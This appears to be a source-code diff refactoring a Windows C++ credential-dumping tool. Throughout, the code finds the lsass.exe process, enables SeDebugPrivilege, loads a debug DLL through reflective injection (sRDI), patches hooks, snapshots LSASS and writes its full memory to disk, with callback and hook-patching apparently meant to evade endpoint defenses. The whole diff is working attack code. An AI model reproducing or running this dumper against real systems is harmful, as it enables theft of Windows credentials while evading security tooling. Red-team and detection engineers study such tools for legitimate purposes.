@@ -9,99 +9,116 @@ using namespace std;
 // Global functions
 fnRtlInitUnicodeString RtlInitUnicodeString;
 fnRtlEqualUnicodeString RtlEqualUnicodeString;
-fnRtlGetVersion RtlGetVersion;
 fnPssCaptureSnapshot PssCaptureSnapshot;
+fnPssFreeSnapshot PssFreeSnapshot;
 
 // Function:    Dump
 // Description: Dump LSASS process memory to disk
-// Arguments:   Wide char array containing dump file path
+// Arguments:   Pointer to wide char array containing dump file path
 // Called from: main/DllMain
 // Returns:     True if dump was successful
-BOOL Dump(const wchar_t* wcDumpPath)
+BOOL Dump(LPWSTR dumpPath)
 {
     // Check requirements before anything else
     if (!Requirements())
         return FALSE;
 
-    // Resolve RTL functions
+    // Dynamically resolve RTL/PSS functions
     if (!ResolveFunctions())
         return FALSE;
 
     // Patch hooks as needed
     PatchHooks();
 
-    HANDLE hDump = NULL;    // Handle to dump file
-    HANDLE hLsass = NULL;   // Handle to LSASS process
-    DWORD dwPid = 0;        // LSASS PID
-    DWORD dwResult = 0;     // Result of LSASS snapshot attempt
-    HPSS hSnapshot = NULL;  // Handle to LSASS PSS snapshot
-    BOOL bStatus = FALSE;   // Status of dump
+    // Status of the dump procedure
+    BOOL status = FALSE;
+
+    // Initialize handle to dump file
+    HANDLE dump = NULL;
 
     // Create destination file
-    if ((hDump = CreateDumpFile(wcDumpPath)) != NULL) {
+    if ((dump = CreateDumpFile(dumpPath)))
+    {
+        // Initialize LSASS PID variable
+        DWORD lsassPid = 0;
 
         // Get LSASS PID
-        if ((dwPid = GetPid()) > 0) {
+        if ((lsassPid = GetPid()))
+        {
+            // Initialize LSASS handle
+            HANDLE lsass = NULL;
 
             // Open LSASS
-            if ((hLsass = GetHandle(dwPid)) != NULL) {
+            if ((lsass = GetHandle(lsassPid)))
+            {
+                wcout << "[+] Successfully opened LSASS, PID: " << lsassPid << endl;
 
-                wcout << "[+] Successfully opened LSASS, PID: " << dwPid << endl;
+                // Initialize handle to debug DLL loaded by sRDI
+                HMODULE debugDll = NULL; 
 
-                // Use sRDI to load debug DLL
-                HMODULE hDebugDLL = LoadDLL(GetDebugDLLPath().data());
-
-                if (hDebugDLL) {
+                // Perform sRDI and get handle to debug DLL
+                if ((debugDll = LoadDLL((LPSTR)GetDebugDLLPath().data())))
+                {
                     // sRDI successful, get MiniDumpWriteDump function pointer
-                    fnMiniDumpWriteDump MiniDumpWriteDump = (fnMiniDumpWriteDump)GetProcAddressR(hDebugDLL, "MiniDumpWriteDump");
+                    fnMiniDumpWriteDump MiniDumpWriteDump = (fnMiniDumpWriteDump)GetProcAddressR(debugDll, "MiniDumpWriteDump");
 
-                    if (MiniDumpWriteDump) {
+                    if (MiniDumpWriteDump)
+                    {
+                        // Result of LSASS snapshot attempt
+                        DWORD snapshotResult = 0;
+
+                        // Initialize handle to LSASS snapshot
+                        HPSS snapshot = NULL;
 
                         // Capture snapshot of LSASS
-                        if ((dwResult = PssCaptureSnapshot(hLsass, (PSS_CAPTURE_FLAGS)dwSnapshotFlags, CONTEXT_ALL, &hSnapshot)) == ERROR_SUCCESS) {
-                            MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
-                            ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
-                            CallbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
-                            CallbackInfo.CallbackParam = NULL;
-
+                        if ((snapshotResult = PssCaptureSnapshot(lsass, (PSS_CAPTURE_FLAGS)snapshotFlags, CONTEXT_ALL, &snapshot)) == ERROR_SUCCESS)
+                        {
                             wcout << "[+] Captured snapshot of LSASS process" << endl;
-                            wcout << "[+] Dumping to: " << wcDumpPath << endl;
+                            wcout << "[+] Dumping to: " << dumpPath << endl;
+
+                            // Initialize MiniDumpWriteDump callback struct
+                            MINIDUMP_CALLBACK_INFORMATION callbackInfo;
+                            SecureZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+                            callbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
+                            callbackInfo.CallbackParam = NULL;
 
                             // Perform the dump
-                            bStatus = MiniDumpWriteDump(hSnapshot, dwPid, hDump, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
-
-                            if (!bStatus)
-                                wcout << "[!] Dump failed: " << GetLastError() << endl;
-                            else
+                            if ((status = MiniDumpWriteDump(snapshot, NULL, dump, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo)))
                                 wcout << "[+] Dump complete" << endl;
+                            else
+                                wcout << "[!] Dump failed: " << GetLastError() << endl;
+
+                            // Free snapshot
+                            PssFreeSnapshot(GetCurrentProcess(), snapshot);
                         }
-                        else wcout << "[!] LSASS snapshot failed: " << dwResult << endl;
+                        else wcout << "[!] Failed to take snapshot of LSASS: " << snapshotResult << endl;
                     }
                     else wcout << "[!] Failed to locate MiniDumpWriteDump function" << endl;
                 }
-                else wcout << "[!] Failed to perform sRDI" << endl;
+                else wcout << "[!] Failed to load debug DLL via sRDI" << endl;
+
+                // Close LSASS handle
+                NtClose(lsass);
             }
             else wcout << "[!] Failed to open LSASS" << endl;
         }
         else wcout << "[!] Failed to locate LSASS PID" << endl;
-    } 
-    else {
-        wcout << "[!] Failed to create dump file" << endl;
-        return FALSE;
+
+        // Close file handle
+        NtClose(dump);
+
+        if (!status)
+        {
+            // Dump failed, attempt to clean up
+            if (DeleteDumpFile(dumpPath))
+                wcout << "[+] Removed dump file" << endl;
+            else
+                wcout << "[!] Failed to remove dump file" << endl;
+        }
     }
+    else wcout << "[!] Failed to create dump file" << endl;
 
-    // Close handles as needed
-    if (hLsass) NtClose(hLsass);
-    if (hDump) NtClose(hDump);
-
-    if (!bStatus)
-        // Dump failed, attempt to clean up
-        if (DeleteDumpFile(wcDumpPath))
-            wcout << "[+] Removed dump file" << endl;
-        else
-            wcout << "[!] Failed to remove dump file" << endl;
-
-    return bStatus;
+    return status;
 }
 
 // Function:    Requirements
@@ -111,91 +128,101 @@ BOOL Dump(const wchar_t* wcDumpPath)
 BOOL Requirements()
 {
     // 64-bit only
-    if (sizeof(LPVOID) != 8) {
+    if (sizeof(LPVOID) != 8)
+    {
         wcout << "[!] 64-bit architecture only" << endl;
         return FALSE;
     }
 
-    HANDLE hToken = NULL; // Process token handle
+    // Overall status of requirement checks
+    BOOL status = FALSE;
+
+    // Initialize handle to process token
+    HANDLE token = NULL;
 
     // Open our token
-    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken) == 0) {
+    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token) == 0)
+    {
+        // Token elevation struct
+        TOKEN_ELEVATION tokenElevation = { 0 };
 
-        TOKEN_ELEVATION Elevation = { 0 };      // Struct for elevation info
-        DWORD dwSize = sizeof(TOKEN_ELEVATION); // Size of struct
+        // Size of token elevation struct
+        DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);
 
         // Get token elevation status
-        if (NtQueryInformationToken(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize) == 0) {
-            
-            if (!Elevation.TokenIsElevated) {
-                // Token is not elevated
-                wcout << "[!] Administrative privileges required" << endl;
-                return FALSE;
-            }
-        }
-        else return FALSE;
-    } 
-    else return FALSE;
+        if (NtQueryInformationToken(token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) == 0)
+        {
+            // Check if token is elevated
+            if (tokenElevation.TokenIsElevated)
+            {
+                // Token is elevated, check/enable SeDebugPrivilege
 
-    DWORD dwSize = 0; // Size needed for token privilege struct
+                // Size of token privilege struct
+                DWORD tokenPrivsSize = 0;
 
-    // Get size of current privilege array
-    if (NtQueryInformationToken(hToken, TokenPrivileges, NULL, NULL, &dwSize) != 0xC0000023)
-        return FALSE;
-    
-    // Allocate memory to store current token privileges
-    LPBYTE lpBuffer = new BYTE[dwSize];
+                // Get size of current privilege array
+                if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) == 0xC0000023)
+                {
+                    // Allocate memory to store current token privileges
+                    PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];
 
-    // Sanity check buffer allocation
-    if (!lpBuffer)
-        return FALSE;
+                    // Get current token privileges
+                    if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) == 0)
+                    {
+                        // Track whether or not token has SeDebugPrivilege
+                        BOOL hasDebug = FALSE;
 
-    BOOL bMet = FALSE; // Requirements met?
+                        // Loop through privileges assigned to token to find SeDebugPrivilege
+                        for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
+                        {
+                            // SeDebugPrivilege LUID = 0x14
+                            if (tokenPrivs->Privileges[i].Luid.LowPart == 0x14)
+                            {
+                                hasDebug = TRUE;
 
-    // Get current token privileges
-    if (NtQueryInformationToken(hToken, TokenPrivileges, lpBuffer, dwSize, &dwSize) == 0) {
+                                // Located SeDebugPrivilege, enable it if necessary
+                                if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
+                                {
+                                    tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
 
-        // Assign struct pointer to buffer
-        PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)lpBuffer;
+                                    // Apply updated privilege struct to token
+                                    if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)
+                                    {
+                                        wcout << "[+] Enabled SeDebugPrivilege" << endl;
+                                        status = TRUE;
+                                        break;
+                                    }
+                                    else wcout << "[!] Failed to enable SeDebugPrivilege" << endl;
+                                }
+                                else
+                                {
+                                    wcout << "[+] SeDebugPrivilege already enabled" << endl;
+                                    status = TRUE;
+                                    break;
+                                }
+                            }
+                        }
 
-        // Loop through privileges assigned to token to find SeDebugPrivilege
-        for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
-            
-            // SeDebugPrivilege LUID = 0x14
-            if (pTokenPrivs->Privileges[i].Luid.LowPart == 0x14) {
-                
-                // Located SeDebugPrivilege, enable it if necessary
-                if (!(pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
-
-                    pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
-
-                    // Apply updated privilege struct to token
-                    if (NtAdjustPrivilegesToken(hToken, FALSE, pTokenPrivs, dwSize, NULL, NULL) == 0) {
-                    
-                        wcout << "[+] Enabled SeDebugPrivilege" << endl;
-
-                        // Should be good to go
-                        bMet = TRUE;
+                        if (!hasDebug)
+                            wcout << "[!] Token does not have SeDebugPrivilege" << endl;
                     }
+                    else wcout << "[!] Failed to query token privileges" << endl;
+
+                    // Free token privileges buffer
+                    delete tokenPrivs;
                 }
-                // SeDebugPrivilege already enabled
-                else bMet = TRUE;
+                else wcout << "[!] Failed to determine size of token privileges array" << endl;
             }
+            else wcout << "[!] Administrative privileges required" << endl;
         }
+        else wcout << "[!] Failed to query token elevation status" << endl;
 
-        if (!bMet)
-            wcout << "[!] Token does not have SeDebugPrivilege" << endl;
+        // Close token handle
+        NtClose(token);
     }
+    else wcout << "[!] Failed to open process token" << endl;
 
-    // Free buffer
-    if (lpBuffer)
-        delete lpBuffer;
-
-    // Close token handle
-    if (hToken)
-        NtClose(hToken);
-
-    return bMet;
+    return status;
 }
 
 // Function:    ResolveFunctions
@@ -205,16 +232,16 @@ BOOL Requirements()
 BOOL ResolveFunctions()
 {
     // Module handles
-    HMODULE hNTDLL = GetModuleHandle(L"ntdll.dll");
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
+    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
 
     // Get function pointers
-    RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
-    RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(hNTDLL, "RtlEqualUnicodeString");
-    RtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNTDLL, "RtlGetVersion");
-    PssCaptureSnapshot = (fnPssCaptureSnapshot)GetProcAddress(hKernel32, "PssCaptureSnapshot");
+    RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
+    RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
+    PssCaptureSnapshot = (fnPssCaptureSnapshot)GetProcAddress(kernel32, "PssCaptureSnapshot");
+    PssFreeSnapshot = (fnPssFreeSnapshot)GetProcAddress(kernel32, "PssFreeSnapshot");
 
-    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !RtlGetVersion || !PssCaptureSnapshot)
+    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !PssCaptureSnapshot || !PssFreeSnapshot)
         return FALSE;
     else
         return TRUE;
@@ -226,54 +253,61 @@ BOOL ResolveFunctions()
 // Returns:     PID, 0 on failure
 DWORD GetPid()
 {
-    ULONG ulSize = 0;                       // Size of process table
-    HANDLE hProcess = GetCurrentProcess();  // Handle to local process
-    HANDLE hHeap = GetProcessHeap();        // Handle to local heap
+    // LSASS PID
+    DWORD pid = 0;
+
+    // Size of process info table, set by NtQuerySystemInformation
+    ULONG processInfoSize = 0;
 
     // Get size of the process table
-    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ulSize) != 0xC0000004)
-        // Expecting specific STATUS_INFO_LENGTH_MISMATCH status
-        return 0;
+    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &processInfoSize) == 0xC0000004)
+    {
+        // Initialize process info buffer
+        LPVOID processInfoBuffer = NULL;
 
-    // Allocate memory to store process table
-    LPVOID lpBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulSize);
+        // Get handle to heap
+        HANDLE heap = GetProcessHeap();
 
-    // Verify allocation was successful
-    if (!lpBuffer)
-        return 0;
+        // Allocate memory for process info
+        if ((processInfoBuffer = HeapAlloc(heap, HEAP_ZERO_MEMORY, processInfoSize)))
+        {
+            // Get process information
+            if (NtQuerySystemInformation(SystemProcessInformation, processInfoBuffer, processInfoSize, &processInfoSize) == 0)
+            {
+                // Assign process info pointer to buffer
+                PSYSTEM_PROCESSES processInfo = (PSYSTEM_PROCESSES)processInfoBuffer;
 
-    // Get process information
-    if (NtQuerySystemInformation(SystemProcessInformation, lpBuffer, ulSize, &ulSize) < 0) {
-        // Failed for some reason, clean up and return
-        if (lpBuffer)
-            HeapFree(hHeap, NULL, lpBuffer);
-        return 0;
-    }
+                // Create unicode string for "lsass.exe"
+                UNICODE_STRING lsassString;
+                RtlInitUnicodeString(&lsassString, L"lsass.exe");
 
-    DWORD dwPid = 0; // PID
+                // Loop through processes until lsass.exe is found
+                while (processInfo->NextEntryDelta)
+                {
+                    if (RtlEqualUnicodeString(&processInfo->ProcessName, &lsassString, TRUE))
+                    {
+                        // Found lsass.exe, capture the PID
+                        pid = HandleToULong(processInfo->ProcessId);
+                        break;
+                    }
 
-    // Create process info struct from buffer
-    PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)lpBuffer;
+                    // Move pointer to next entry in the process table
+                    processInfo = (PSYSTEM_PROCESSES)(((LPBYTE)processInfo) + processInfo->NextEntryDelta);
+                }
+            }
+            else wcout << "[!] Failed to query system process information" << endl;
 
-    // Create unicode string
-    UNICODE_STRING usLsass;
-    RtlInitUnicodeString(&usLsass, L"lsass.exe");
-
-    // Loop through processes until lsass.exe is found
-    while (pProcInfo->NextEntryDelta) {
-        if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &usLsass, TRUE)) {
-            // Found lsass.exe, capture the PID
-            dwPid = HandleToUlong(pProcInfo->ProcessId);
-            break;
+            // Free process info buffer
+            HeapFree(heap, NULL, processInfoBuffer);
         }
-        pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
+        else wcout << "[!] Failed to allocate memory for system process information" << endl;
+
+        // Close heap handle
+        NtClose(heap);
     }
+    else wcout << "[!] Failed to determine amount of memory needed for system process information" << endl;
 
-    // Free buffer
-    if (lpBuffer)
-        HeapFree(hHeap, NULL, lpBuffer);
-
-    return dwPid;
+    return pid;
 }
 
 // Function:    GetHandle
@@ -281,18 +315,20 @@ DWORD GetPid()
 // Arguments:   Target process PID
 // Called from: Dump
 // Returns:     Handle to target process, NULL on failure
-HANDLE GetHandle(DWORD dwPid)
+HANDLE GetHandle(DWORD pid)
 {
     // Initialize client ID and object attributes
-    CLIENT_ID cid = { UlongToHandle(dwPid), NULL };
+    CLIENT_ID cid = { ULongToHandle(pid), NULL };
     OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL };
 
-    // Open the process
-    HANDLE hProcess = NULL;
-    NtOpenProcess(&hProcess, PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cid);
+    // Initialize process handle
+    HANDLE handle = NULL;
 
-    // Return handle
-    return hProcess;
+    // Open the process
+    NtOpenProcess(&handle, PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cid);
+
+    // Return handle (or NULL on failure)
+    return handle;
 }
 
 // Function:    GetDebugDLLPath
@@ -303,75 +339,75 @@ string GetDebugDLLPath()
 {
     // Get system directory, e.g. c:\windows\system32
     CHAR systemDir[MAX_PATH];
-    UINT size = GetSystemDirectoryA(systemDir, MAX_PATH);
+    UINT systemDirSize = GetSystemDirectoryA(systemDir, MAX_PATH);
 
     // Initialize string with system directory
-    string sPath(systemDir, size);
-    
-    sPath += "\\"; // Append slash
-    
+    string path(systemDir, systemDirSize);
+
+    path += "\\"; // Append slash
+
     // Append appropriate DLL name
     if (GetWinVersion() == 10)
         // Use dbgcore.dll with Windows 10
-        sPath += "dbgcore.dll";
+        path += "dbgcore.dll";
     else
         // Use dbghelp.dll for everything else
-        sPath += "dbghelp.dll";
+        path += "dbghelp.dll";
 
-    return sPath;
+    return path;
 }
 
 // Function:    CreateDumpFile
 // Description: Create dump file at specified location
-// Arguments:   Wide char array containing destination file path
+// Arguments:   Pointer to wide char array containing destination file path
 // Called from: Dump
 // Returns:     Handle to dump file, NULL on failure
-HANDLE CreateDumpFile(const wchar_t* wcDumpPath)
+HANDLE CreateDumpFile(LPWSTR path)
 {
     // Path to dump file in NT format
-    wstring sDumpPath(L"\\??\\");
-    sDumpPath += wcDumpPath;
+    wstring ntPath(L"\\??\\");
+    ntPath += path;
 
     // Convert path wide string to unicode string
-    UNICODE_STRING usDumpPath;
-    RtlInitUnicodeString(&usDumpPath, sDumpPath.data());
+    UNICODE_STRING pathString;
+    RtlInitUnicodeString(&pathString, ntPath.data());
 
     // File handle and structs
-    HANDLE hFile = NULL;
-    IO_STATUS_BLOCK IoStatusBlock;
-    SecureZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-    OBJECT_ATTRIBUTES FileObjectAttributes;
-    InitializeObjectAttributes(&FileObjectAttributes, &usDumpPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    HANDLE file = NULL;
+    IO_STATUS_BLOCK ioStatusBlock;
+    SecureZeroMemory(&ioStatusBlock, sizeof(ioStatusBlock));
+    OBJECT_ATTRIBUTES fileObjectAttributes;
+    InitializeObjectAttributes(&fileObjectAttributes, &pathString, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     // Create dump file
-    NtCreateFile(&hFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0, FILE_ATTRIBUTE_NORMAL,
+    NtCreateFile(&file, FILE_GENERIC_WRITE, &fileObjectAttributes, &ioStatusBlock, 0, FILE_ATTRIBUTE_NORMAL,
                     FILE_SHARE_WRITE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
     // Return handle
-    return hFile;
+    return file;
 }
 
 // Function:    DeleteDumpFile
 // Description: Delete dump file
-// Arguments:   Wide char array containing path to file to delete
+// Arguments:   Pointer to wide char array containing path to file to delete
 // Called from: Dump
 // Returns:     True on success
-BOOL DeleteDumpFile(const wchar_t* wcDumpPath)
+BOOL DeleteDumpFile(LPWSTR path)
 {
     // Path to dump file in NT format
-    wstring sDumpPath(L"\\??\\");
-    sDumpPath += wcDumpPath;
+    wstring ntPath(L"\\??\\");
+    ntPath += path;
 
     // Convert path wide string to unicode string
-    UNICODE_STRING usDumpPath;
-    RtlInitUnicodeString(&usDumpPath, sDumpPath.data());
+    UNICODE_STRING pathString;
+    RtlInitUnicodeString(&pathString, ntPath.data());
 
     // File object attributes
-    OBJECT_ATTRIBUTES FileObjectAttributes;
-    InitializeObjectAttributes(&FileObjectAttributes, &usDumpPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    OBJECT_ATTRIBUTES fileObjectAttributes;
+    InitializeObjectAttributes(&fileObjectAttributes, &pathString, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     // Delete dump file
-    if (NtDeleteFile(&FileObjectAttributes) != 0)
+    if (NtDeleteFile(&fileObjectAttributes) != 0)
         // Failed to delete file
         return FALSE;
     else
@@ -380,17 +416,15 @@ BOOL DeleteDumpFile(const wchar_t* wcDumpPath)
 }
 
 // Function:    GetWinVersion
-// Description: Get Windows major version
-// Called from: GetDebugDLLPath
+// Description: Get Windows major version from KUSER_SHARED_DATA
+// Called from: GetMiniDumpWriteDump
 // Returns:     Major version, e.g. 5, 6, 10
+// Source:      https://gist.github.com/slaeryan/2c73c4c4e33dfd7d8ce38312aacc9324
+#define KUSER_SHARED_DATA 0x7ffe0000
+#define MAJOR_VERSION_OFFSET 0x026C
 DWORD GetWinVersion()
 {
-    RTL_OSVERSIONINFOEXW osVers = { 0 };
-    osVers.dwOSVersionInfoSize = sizeof(osVers);
-
-    RtlGetVersion(&osVers);
-
-    return osVers.dwMajorVersion;
+    return *(PULONG)(KUSER_SHARED_DATA + MAJOR_VERSION_OFFSET);
 }
 
 // Function:    ATPMiniDumpWriteDumpCallback
